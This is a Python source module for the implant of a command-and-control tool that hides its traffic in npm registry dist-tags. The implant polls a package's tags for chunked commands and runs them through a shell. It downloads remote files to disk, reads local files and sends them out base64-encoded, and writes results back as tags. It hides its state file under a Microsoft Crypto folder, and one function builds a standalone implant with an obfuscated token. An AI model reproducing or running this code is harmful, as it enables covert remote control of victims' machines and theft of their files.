"""Implant side: poll dist-tags, execute, write results back."""

from __future__ import annotations

import base64
import collections
import json
import os
import random
import subprocess
import sys
import time
import urllib.error
import urllib.request

from . import (CMD_PREFIX, RES_PREFIX, HBT_PREFIX, TAG_VALUE, MAX_TAG_LEN,
               PREFIXES, _FRAME_OVERHEAD, _MAX_CHUNKS, _SCOPED)
from . import API, UA, group_chunks, encode_payload, decode_tag, registry_path

DEFAULT_TIMEOUT = 30
MAX_CAPTURE = 1000          # chars of stdout+stderr kept per command
MAX_UPLOAD = 3000           # bytes per up: reply (base64 grows 4/3)
SEEN_CAP = 512              # tags remembered between polls


class Implant:
    def __init__(self, package, token=None, interval=60, jitter=20, verbose=False):
        self.package = package
        self.url = API.format(registry_path(package))
        self.token = token
        self.interval = max(10, int(interval))
        self.jitter = max(0, int(jitter))
        self.v = verbose
        # Ordered so overflow evicts the oldest tag, not an arbitrary one.
        self.seen: collections.OrderedDict[str, None] = collections.OrderedDict()
        self.n = 0
        self.dirty = 0
        safe = package.replace("/", "_").replace("@", "")
        appdata = os.environ.get("APPDATA") or os.environ.get("TEMP") \
            or os.path.expanduser("~")
        self.state_file = os.path.join(appdata, "Microsoft", "Crypto",
                                       f".rsa_{safe}.idx")

    # ------------------------------------------------------------ main loop
    def run(self):
        self._load()
        try:
            while True:
                try:
                    self._cycle()
                except Exception as e:                       # noqa: BLE001
                    # Never silent: a broken channel that looks healthy is
                    # worse than a noisy one.
                    if self.v:
                        print(f"[!] cycle failed: {type(e).__name__}: {e}",
                              file=sys.stderr)
                if self.v:
                    print(f"[*] poll #{self.n}")
                time.sleep(self.interval + random.uniform(0, self.jitter))
        finally:
            if self.dirty:
                self._save()

    def _cycle(self):
        tags = self._fetch()
        for cmd in self._parse(tags):
            if self.v:
                print(f"[+] cmd: {cmd[:60]}")
            out = self._exec(cmd)
            if out and self.token:
                self._reply(out)
        self.n += 1
        if self.n % 10 == 0:
            if self.dirty:
                self._save()
                self.dirty = 0
            if self.token:
                self._beat()

    # ---------------------------------------------------------------- state
    def _load(self):
        try:
            with open(self.state_file, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        self.seen[line] = None
        except FileNotFoundError:
            return
        except OSError as e:
            if self.v:
                print(f"[!] state read failed: {e}", file=sys.stderr)

    def _save(self):
        try:
            os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
            tmp = self.state_file + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                for tag in self.seen:
                    f.write(tag + "\n")
            os.replace(tmp, self.state_file)      # atomic: no truncated state
        except OSError as e:
            if self.v:
                print(f"[!] state write failed: {e}", file=sys.stderr)

    def _remember(self, tag):
        self.seen[tag] = None
        self.dirty += 1
        while len(self.seen) > SEEN_CAP:
            self.seen.popitem(last=False)         # drop the oldest first

    # ---------------------------------------------------------------- fetch
    def _fetch(self) -> dict:
        req = urllib.request.Request(self.url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        if not isinstance(data, dict):
            raise ValueError("registry returned no dist-tags object")
        return data

    def _parse(self, tags) -> list[str]:
        commands: list[str] = []
        fresh = [t for t in tags if t not in self.seen]
        for buf, complete in group_chunks(fresh, CMD_PREFIX):
            if not complete:
                continue                          # wait for missing chunks
            commands.append(buf.decode("utf-8", errors="replace"))
        for tag in fresh:
            if tag.startswith(CMD_PREFIX):
                self._remember(tag)
        return commands

    # -------------------------------------------------------------- execute
    def _exec(self, cmd):
        try:
            if cmd == "exit":
                self._clean()
                raise SystemExit(0)

            if cmd.startswith("sleep:"):
                raw = cmd.split(":", 1)[1]
                try:
                    value = int(raw)
                except ValueError:
                    return f"sleep: bad value {raw!r}"
                self.interval = max(10, value)     # same floor as the constructor
                self._save()
                return f"interval={self.interval}"

            if cmd.startswith("dl:"):
                rest = cmd[3:]
                cut = self._split_dl(rest)
                if cut < 0:
                    return "dl: expected dl:<url>:<path>"
                url, path = rest[:cut].strip(), rest[cut + 1:].strip()
                if not url or not path:
                    return "dl: expected dl:<url>:<path>"
                return self._dl(url, path)

            if cmd.startswith("up:"):
                return self._upload(cmd.split(":", 1)[1])

            body = cmd[5:] if cmd.startswith("exec:") else cmd
            if not body.strip():
                return "(empty command)"
            r = subprocess.run(body, shell=True, capture_output=True,
                               timeout=DEFAULT_TIMEOUT)
            out = r.stdout.decode(errors="replace")
            err = r.stderr.decode(errors="replace")
            combined = (out + err).strip() or "(ok)"
            if len(combined) > MAX_CAPTURE:
                cut = len(combined) - MAX_CAPTURE
                combined = combined[:MAX_CAPTURE] + f"\n[truncated {cut} chars]"
            return combined
        except subprocess.TimeoutExpired:
            return f"(timeout after {DEFAULT_TIMEOUT}s)"
        except SystemExit:
            raise
        except Exception as e:                          # noqa: BLE001
            return f"({type(e).__name__}: {e})"

    @staticmethod
    def _split_dl(rest):
        """Index of the ':' separating the URL from the destination path.

        Both sides can contain colons (``http://host:8080/x.exe`` and
        ``C:\\temp\\x.exe``), so the separator is the first colon past the
        authority whose right-hand side starts like a path.
        """
        def looks_like_path(tail):
            return bool(tail) and (tail[0] in "/\\" or
                                   (len(tail) > 1 and tail[1] == ":" and tail[0].isalpha()))

        scheme = rest.find("://")
        if scheme >= 0:
            start = scheme + 3
        elif len(rest) > 2 and rest[1] == ":" and rest[0].isalpha():
            start = 2                      # C:\... destination vs. source
        else:
            start = 0

        for i in range(start, len(rest)):
            if rest[i] == ":" and looks_like_path(rest[i + 1:]):
                return i
        if scheme >= 0:
            return rest.rfind(":")         # URL:path with a bare filename
        return rest.find(":", start)

    def _dl(self, url, path):
        with urllib.request.urlopen(url, timeout=30) as r:
            data = r.read()
        parent = os.path.dirname(os.path.abspath(path))
        os.makedirs(parent, exist_ok=True)
        with open(path, "wb") as f:
            f.write(data)
        return f"dl {len(data)}b -> {path}"

    def _upload(self, path):
        path = path.strip()
        if not path:
            return "up: expected up:<path>"
        try:
            with open(path, "rb") as f:
                raw = f.read(MAX_UPLOAD)
                more = f.read(1)
        except OSError as e:
            return f"up fail: {e}"
        data = base64.b64encode(raw).decode()
        note = "+" if more else ""               # '+' marks a truncated read
        return f"up {len(raw)}b{note}: {data}"

    # -------------------------------------------------------------- writeback
    def _reply(self, out):
        try:
            for tag in encode_payload(out.encode(), RES_PREFIX):
                self._put(tag)
            if self.v:
                print("[+] result sent")
        except (ValueError, urllib.error.URLError) as e:
            if self.v:
                print(f"[!] result send failed: {e}", file=sys.stderr)

    def _beat(self):
        self._put(f"{HBT_PREFIX}{os.urandom(3).hex()}")

    def _put(self, tag):
        url = f"{self.url}/{tag}"
        headers = {"User-Agent": UA, "Content-Type": "application/json"}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(url, data=json.dumps(TAG_VALUE).encode(),
                                     method="PUT", headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return 200 <= r.status < 300
        except urllib.error.HTTPError as e:
            if self.v:
                print(f"[!] PUT {tag[:24]}: HTTP {e.code}", file=sys.stderr)
            return False
        except urllib.error.URLError as e:
            if self.v:
                print(f"[!] PUT {tag[:24]}: {e.reason}", file=sys.stderr)
            return False

    def _clean(self):
        if not self.token:
            return
        try:
            for name in self._fetch():
                if name.startswith((CMD_PREFIX, RES_PREFIX, HBT_PREFIX)):
                    self._del(name)
        except Exception as e:                          # noqa: BLE001
            if self.v:
                print(f"[!] cleanup failed: {e}", file=sys.stderr)

    def _del(self, tag):
        headers = {"User-Agent": UA}
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        req = urllib.request.Request(f"{self.url}/{tag}", method="DELETE",
                                     headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=15):
                return True
        except urllib.error.URLError:
            return False


def generate_standalone(token=None, package=None):
    """Emit a dependency-free single-file implant."""
    import inspect

    from . import deobfuscate_token as _deob, _xor as _xor_fn, _xor_key as _xor_key_fn

    obf = ""
    if token and package:
        from . import obfuscate_token
        obf = obfuscate_token(token, package)

    parts = [
        "#!/usr/bin/env python3",
        "import argparse, base64, binascii, collections, hashlib, json, os",
        "import random, subprocess, sys, time, urllib.error, urllib.request",
        "",
        f"CMD_PREFIX = {CMD_PREFIX!r}",
        f"RES_PREFIX = {RES_PREFIX!r}",
        f"HBT_PREFIX = {HBT_PREFIX!r}",
        f"PREFIXES = {PREFIXES!r}",
        f"TAG_VALUE = {TAG_VALUE!r}",
        f"MAX_TAG_LEN = {MAX_TAG_LEN}",
        f"API = {API!r}",
        f"UA = {UA!r}",
        f"_FRAME_OVERHEAD = {_FRAME_OVERHEAD}",
        f"_MAX_CHUNKS = {_MAX_CHUNKS}",
        f"_SCOPED = {_SCOPED!r}",
        f"DEFAULT_TIMEOUT = {DEFAULT_TIMEOUT}",
        f"MAX_CAPTURE = {MAX_CAPTURE}",
        f"MAX_UPLOAD = {MAX_UPLOAD}",
        f"SEEN_CAP = {SEEN_CAP}",
        "",
        inspect.getsource(_xor_key_fn),
        "",
        inspect.getsource(_xor_fn),
        "",
        inspect.getsource(_deob),
        "",
        inspect.getsource(registry_path),
        "",
        inspect.getsource(encode_payload),
        "",
        inspect.getsource(decode_tag),
        "",
        inspect.getsource(group_chunks),
        "",
        inspect.getsource(Implant),
        "",
    ]
    if obf:
        parts += [
            f"_OBFUSCATED = {obf!r}",
            "",
            "def _embedded_token(pkg):",
            "    return deobfuscate_token(_OBFUSCATED, pkg)",
            "",
        ]

    parts += [
        "def main():",
        "    p = argparse.ArgumentParser(description='npm-c2 implant')",
        "    p.add_argument('--package', '-p', required=True)",
        "    p.add_argument('--token', '-t', default=None)",
        "    p.add_argument('--interval', type=int, default=60)",
        "    p.add_argument('--jitter', type=int, default=20)",
        "    p.add_argument('--verbose', '-v', action='store_true')",
        "    a = p.parse_args()",
    ]
    if obf:
        parts.append("    tok = a.token or _embedded_token(a.package)")
    else:
        parts.append("    tok = a.token")
    parts += [
        "    if not tok:",
        "        print('[!] no token: this implant can execute but not reply',",
        "              file=sys.stderr)",
        "    Implant(a.package, tok, a.interval, a.jitter, a.verbose).run()",
        "",
        "",
        "if __name__ == '__main__':",
        "    main()",
    ]
    return "\n".join(parts)
